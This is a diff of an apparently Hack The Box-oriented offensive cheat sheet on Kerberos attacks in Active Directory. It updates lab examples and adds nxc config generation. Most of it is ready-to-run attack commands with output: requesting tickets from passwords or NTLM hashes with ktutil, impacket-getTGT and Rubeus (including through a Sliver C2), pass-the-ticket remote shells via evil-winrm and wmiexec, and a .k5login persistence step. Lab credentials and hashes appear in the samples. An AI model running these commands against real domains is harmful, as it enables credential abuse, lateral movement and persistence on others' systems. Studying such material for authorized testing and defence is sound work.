@@ -78,117 +78,83 @@ msf6 auxiliary(gather/kerberos_enumusers) > run
 
 ---
 
-### Usernames Generator
+### Kerberos Ticket (From Linux)
 
-{{< tab set2 tab1 >}}username-anarchy{{< /tab >}}
-{{< tabcontent set2 tab1 >}}
+#### 1. Config /etc/hosts
 
 ```console
-./username-anarchy -i <USERS> | tee <USERS_FILE>
+sudo nxc smb <DC_IP> --generate-hosts-file /etc/hosts
 ```
 
 ```console {class="sample-code"}
-$ username-anarchy -i users.txt | tee usernames.txt
-james
-jamesroberts
-james.roberts
-jamesrob
-jamerobe
----[SNIP]---
+$ sudo nxc smb 10.129.235.149 --generate-hosts-file /etc/hosts
+SMB         10.129.235.149  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
+                                                                                                                                                                                                                    
+$ tail -n1 /etc/hosts
+10.129.235.149     DC.administrator.htb administrator.htb DC
 ```
 
-<small>*Ref: [username-anarchy](https://github.com/urbanadventurer/username-anarchy)*</small>
+#### 2. Config /etc/krb5.conf
 
-{{< /tabcontent >}}
+```console
+sudo nxc smb <DC_IP> --generate-krb5-file /etc/krb5.conf
+```
 
----
+```console {class="sample-code"}
+$ sudo nxc smb 10.129.235.149 --generate-krb5-file /etc/krb5.conf
+SMB         10.129.235.149  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
 
-### Kerberos Ticket (From Linux)
+$ cat /etc/krb5.conf
+
+[libdefaults]
+    dns_lookup_kdc = false
+    dns_lookup_realm = false
+    default_realm = ADMINISTRATOR.HTB
+
+[realms]
+    ADMINISTRATOR.HTB = {
+        kdc = dc.administrator.htb
+        admin_server = dc.administrator.htb
+        default_domain = administrator.htb
+    }
+
+[domain_realm]
+    .administrator.htb = ADMINISTRATOR.HTB
+    administrator.htb = ADMINISTRATOR.HTB
+```
+
+#### 3. Config /etc/resolv.conf \[Optional\]
+
+```console
+nameserver <DC_IP>
+```
+
+```console {class="sample-code"}
+nameserver 10.10.11.10
+```
 
 {{< tab set3 tab1 >}}kinit{{< /tab >}}
 {{< tab set3 tab2 >}}impacket{{< /tab >}}
 {{< tabcontent set3 tab1 >}}
 
-#### 1. Setup
+#### 4. Installation \[Optional\]
 
 ```console
-# Step 0: Installation
 sudo apt install krb5-user cifs-utils
 ```
 
-```console
-# Step 1: Add domain controller to '/etc/hosts' (Try different order if not work)
-<TARGET> <DC> <DOMAIN>
-```
-
-```console {class="sample-code"}
-10.10.11.181 dc.absolute.htb absolute.htb
-```
-
-```console
-# Step 2: Add domain controller as a DNS server to '/etc/resolv.conf' [optional]
-nameserver <TARGET>
-```
-
-```console {class="sample-code"}
-nameserver 10.10.11.181
-```
-
-```console
-# Step 3: Edit '/etc/krb5.conf' (All uppercase)
-
-[libdefaults]
-    default_realm = <DOMAIN>
-
-[realms]
-    <DOMAIN> = {
-        kdc = <DC>:88
-        admin_server = <DC>
-        default_domain = <DOMAIN>
-    }
-    
-[domain_realm]
-    .domain.internal = <DOMAIN>
-    domain.internal = <DOMAIN>
-```
-
-```console {class="sample-code"}
-[libdefaults]
-    default_realm = ABSOLUTE.HTB
-
-[realms]
-    ABSOLUTE.HTB = {
-        kdc = DC.ABSOLUTE.HTB:88
-        admin_server = DC.ABSOLUTE.HTB
-        default_domain = ABSOLUTE.HTB
-    }
-    
-[domain_realm]
-    .domain.internal = ABSOLUTE.HTB
-    domain.internal = ABSOLUTE.HTB
-```
-
-```console
-# Step 4: Sync time to domain controller
-sudo ntpdate -s <DC>
-```
-
-```console {class="sample-code"}
-$ sudo ntpdate -s dc.absolute.htb
-```
-
-#### 2. Request a Ticket
+#### 5. Request a Ticket
 
 {{< tab set3-1 tab1 active >}}Password{{< /tab >}}{{< tab set3-1 tab2 >}}NTLM{{< /tab >}}
 {{< tabcontent set3-1 tab1 >}}
 
 ```console
-kinit <USER>
+sudo ntpdate -s <DC_IP> && kinit <USER>
 ```
 
 ```console {class="sample-code"}
-$ kinit m.lovegod
-Password for m.lovegod@ABSOLUTE.HTB:
+$ sudo ntpdate -s 10.129.234.139 && kinit Olivia
+Password for Olivia@ADMINISTRATOR.HTB:
 ```
 
 {{< /tabcontent >}}
@@ -204,20 +170,22 @@ ktutil:
 ```
 
 ```console
-add_entry -p <USER>@<DOMAIN> -k 1 -key -e rc4-hmac
+# Domain in UPPER case
+add_entry -key -p <USER>@<DOMAIN> -k 1 -e rc4-hmac
 ```
 
 ```console {class="sample-code"}
-ktutil:  add_entry -p Administrator@ABSOLUTE.HTB -k 1 -key -e rc4-hmac
-Key for Administrator@ABSOLUTE.HTB (hex): 
+ktutil:  add_entry -key -p Olivia@ADMINISTRATOR.HTB -k 1 -e rc4-hmac
+Key for Olivia@ADMINISTRATOR.HTB (hex): 
 ```
 
 ```console
+# NTLM
 <HASH>
 ```
 
 ```console {class="sample-code"}
-Key for Administrator@ABSOLUTE.HTB (hex): 1f4a6093623653f6488d5aa24c75f2ea
+Key for Olivia@ADMINISTRATOR.HTB (hex): fbaa3e2294376dc0f5aeb6b41ffa52b7
 ktutil:  
 ```
 
@@ -226,7 +194,7 @@ write_kt <USER>.keytab
 ```
 
 ```console {class="sample-code"}
-ktutil:  write_kt Administrator.keytab
+ktutil:  write_kt Olivia.keytab
 ktutil:  
 ```
 
@@ -243,16 +211,16 @@ kinit -V -k -t '<USER>.keytab' -f '<USER>@<DOMAIN>'
 ```
 
 ```console {class="sample-code"}
-$ kinit -V -k -t Administrator.keytab -f Administrator@ABSOLUTE.HTB
+$ kinit -V -k -t 'Olivia.keytab' -f 'Olivia@ADMINISTRATOR.HTB'
 Using default cache: /tmp/krb5cc_1000
-Using principal: Administrator@ABSOLUTE.HTB
-Using keytab: Administrator.keytab
+Using principal: Olivia@ADMINISTRATOR.HTB
+Using keytab: Olivia.keytab
 Authenticated to Kerberos v5
 ```
 
 {{< /tabcontent >}}
 
-#### 3. Check
+#### 6. Check
 
 ```console
 klist
@@ -261,11 +229,11 @@ klist
 ```console {class="sample-code"}
 $ klist
 Ticket cache: FILE:/tmp/krb5cc_1000
-Default principal: Administrator@ABSOLUTE.HTB
+Default principal: Olivia@ADMINISTRATOR.HTB
 
-Valid starting     Expires            Service principal
-09/24/24 21:56:09  09/25/24 07:56:09  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
-        renew until 09/25/24 21:56:08
+Valid starting       Expires              Service principal
+2025-07-15T05:02:44  2025-07-15T15:02:44  krbtgt/ADMINISTRATOR.HTB@ADMINISTRATOR.HTB
+        renew until 2025-07-16T05:02:37
 ```
 
 {{< /tabcontent >}}
@@ -277,29 +245,28 @@ Valid starting     Expires            Service principal
 {{< tabcontent set3-2 tab1 >}}
 
 ```console
-sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
+sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
 ```
 
 ```console {class="sample-code"}
-$ sudo ntpdate -s DC.ABSOLUTE.HTB && impacket-getTGT 'ABSOLUTE.HTB/m.lovegod' 
-Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+$ sudo ntpdate -s 10.129.255.235 && impacket-getTGT 'ADMINISTRATOR.HTB/Olivia:ichliebedich' -dc-ip 10.129.255.235
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
-Password:
-[*] Saving ticket in m.lovegod.ccache
+[*] Saving ticket in Olivia.ccache
 ```
 
 {{< /tabcontent >}}
 {{< tabcontent set3-2 tab2 >}}
 
 ```console
-sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP>
+sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP>
 ```
 
 ```console {class="sample-code"}
-$ sudo ntpdate -s DC.ABSOLUTE.HTB && impacket-getTGT -hashes :1f4a6093623653f6488d5aa24c75f2ea 'ABSOLUTE.HTB/Administrator'
-Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+$ sudo ntpdate -s 10.129.255.235 && impacket-getTGT 'ADMINISTRATOR.HTB/Olivia' -hashes :fbaa3e2294376dc0f5aeb6b41ffa52b7 -dc-ip 10.129.255.235
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
-[*] Saving ticket in Administrator.ccache
+[*] Saving ticket in Olivia.ccache
 ```
 
 {{< /tabcontent >}}
@@ -312,7 +279,7 @@ export KRB5CCNAME='<USER>.ccache'
 ```
 
 ```console {class="sample-code"}
-$ export KRB5CCNAME=Administrator.ccache
+$ export KRB5CCNAME='Olivia.ccache'
 ```
 
 ```console
@@ -322,12 +289,12 @@ klist
 
 ```console {class="sample-code"}
 $ klist
-Ticket cache: FILE:Administrator.ccache
-Default principal: Administrator@ABSOLUTE.HTB
+Ticket cache: FILE:Olivia.ccache
+Default principal: Olivia@ADMINISTRATOR.HTB
 
-Valid starting     Expires            Service principal
-09/24/24 22:20:45  09/25/24 08:20:45  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
-        renew until 09/25/24 22:20:45
+Valid starting       Expires              Service principal
+2025-07-16T20:54:29  2025-07-17T06:54:29  krbtgt/ADMINISTRATOR.HTB@ADMINISTRATOR.HTB
+        renew until 2025-07-17T20:54:29
 ```
 
 {{< /tabcontent >}}
@@ -345,7 +312,7 @@ Valid starting     Expires            Service principal
 {{< tabcontent set4-1 tab1 >}}
 
 ```console
-.\rubeus.exe asktgt /user:<USER> /password:'<PASSWORD>' /enctype:AES256 /domain:<DOMAIN> /dc:<DC> /ptt /nowrap
+.\rubeus.exe asktgt /user:<USER> /password:'<PASSWORD>' /enctype:<ENC_TYPE> /domain:<DOMAIN> /dc:<DC> /ptt /nowrap
 ```
 
 ```console {class="sample-code"}
@@ -471,7 +438,7 @@ Cached Tickets: (2)
 
 ---
 
-### Kerberos Ticket (From Sliver)
+### Kerberos Ticket (From C2)
 
 {{< tab set5 tab1 >}}Sliver{{< /tab >}}
 {{< tabcontent set5 tab1 >}}
@@ -482,7 +449,7 @@ Cached Tickets: (2)
 {{< tabcontent set5-1 tab1 >}}
 
 ```console
-rubeus -- 'asktgt /user:<USER> /password:<PASSWORD> /enctype:AES256 /domain:<DOMAIN> /dc:<DC> /ptt /nowrap'
+rubeus -- 'asktgt /user:<USER> /password:<PASSWORD> /enctype:<ENC_TYPE> /domain:<DOMAIN> /dc:<DC> /ptt /nowrap'
 ```
 
 ```console {class="sample-code"}
@@ -609,8 +576,10 @@ Cached Tickets: (1)
 {{< tab set6 tab2 >}}wmiexec{{< /tab >}}
 {{< tabcontent set6 tab1 >}}
 
+#### 1. Config /etc/krb5.conf
+
 ```console
-# Step 1: Edit '/etc/krb5.conf' (All uppercase)
+# In UPPER case
 
 [libdefaults]
     default_realm = <DOMAIN>
@@ -643,9 +612,10 @@ Cached Tickets: (1)
     domain.internal = ABSOLUTE.HTB
 ```
 
+#### 2. Connect
+
 ```console
-# Step 2: Connect
-sudo ntpdate -s <DC> && evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
+sudo ntpdate -s <DC_IP> && evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
 ```
 
 ```console {class="sample-code"}
@@ -665,7 +635,7 @@ Info: Establishing connection to remote endpoint
 {{< tabcontent set6 tab2 >}}
 
 ```console
-sudo ntpdate -s <DC> && impacket-wmiexec '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -k -no-pass
+sudo ntpdate -s <DC_IP> && impacket-wmiexec '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -k -no-pass
 ```
 
 ```console {class="sample-code"}
@@ -685,7 +655,7 @@ C:\>
 ### SMB with Kerberos
 
 ```console
-sudo ntpdate -s <DC> && impacket-smbclient '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -k -no-pass
+sudo ntpdate -s <DC_IP> && impacket-smbclient '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -k -no-pass
 ```
 
 ```console {class="sample-code"}
@@ -701,5 +671,5 @@ Type help for list of commands
 ### Add Kerberos Access in Linux
 
 ```console
-echo "<USER>@<DOMAIN>" > /home/<TARGET_USER>/.k5login
+echo '<USER>@<DOMAIN>' > /home/<TARGET_USER>/.k5login
 ```
